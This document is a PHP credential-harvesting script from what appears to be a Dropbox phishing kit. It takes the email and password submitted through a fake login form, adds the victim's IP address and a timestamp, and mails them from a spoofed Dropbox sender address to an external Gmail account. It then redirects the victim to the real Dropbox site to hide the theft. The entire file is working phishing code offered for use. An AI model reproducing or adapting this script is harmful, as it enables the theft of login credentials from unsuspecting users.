<?php

$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");

$msg = "---------------------------------------------------------------------------\n";
$msg .= "Dropbox Login Info by Abbeymilli\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Email : ".$_POST['username']."\n";
$msg .= "Password : ".$_POST['password']."\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Sent from $ip on $time\n";
$msg .= "---------------------------------------------------------------------------\n";

$to = "surulere788@gmail.com";
$subject = "Dropbox Update $ip";
$from = "From: Dropbox<newsupdatee@servisdropbox.com>";

mail($to,$subject,$msg,$from);

header("Location: http://www.dropbox.com");


?>